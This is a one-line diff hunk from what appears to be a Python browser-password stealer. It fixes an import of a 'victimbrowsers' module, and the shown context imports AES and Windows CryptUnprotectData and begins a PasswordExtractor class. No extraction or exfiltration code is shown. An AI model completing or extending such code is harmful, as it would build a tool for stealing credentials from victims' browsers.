@@ -5,7 +5,7 @@ import base64
 import json
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
-from victimbrowsers import navegadores_instalados  
+from .victimbrowsers import navegadores_instalados  
 
 
 class PasswordExtractor:
